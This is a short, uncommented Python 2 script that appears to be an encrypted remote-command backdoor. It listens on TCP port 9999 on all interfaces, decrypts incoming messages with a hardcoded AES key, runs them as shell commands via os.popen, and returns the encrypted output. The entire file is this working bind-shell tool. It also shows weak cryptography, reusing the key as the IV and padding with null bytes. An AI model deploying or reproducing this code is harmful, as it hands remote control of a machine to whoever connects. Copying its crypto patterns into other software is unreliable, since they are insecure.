#!/usr/bin/env python

#coding: utf8


import sys
from Crypto.Cipher import AES
from binascii import b2a_hex,a2b_hex

class prpcrypt():
    def __init__(self,key):
        self.key = key
        self.mode = AES.MODE_CBC

    def encrypt(self,text):
        cryptor= AES.new(self.key,self.mode,self.key)
        length = 16
        count = len(text)
        add = length -(count % length)
        text = text +('\0' * add)
        self.ciphertext = cryptor.encrypt(text)

        return b2a_hex(self.ciphertext)

    def decrypt(self,text):
        cryptor = AES.new(self.key,self.mode,self.key)
        plain_text = cryptor.decrypt(a2b_hex(text))
        return plain_text.rstrip('\0')

pc = prpcrypt('liangchangyou123')



import os
import SocketServer
class myTCPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        print "got connection from:",self.client_address
        while 1:
            self.data = self.request.recv(4096)
            e = pc.decrypt(self.data)
            cmd=os.popen(e)
            cmd_result=cmd.read()
            result = pc.encrypt(cmd_result)
            if cmd_result:
                print '\033[31m%s\033[0m' % cmd_result
                self.request.sendall(result)
            else:
                print '\033[31msuccess!!\033[0m'
                a=pc.encrypt('?')
                self.request.sendall(a)
h,p='',9999
sever=SocketServer.ThreadingTCPServer((h,p),myTCPHandler)

sever.serve_forever()


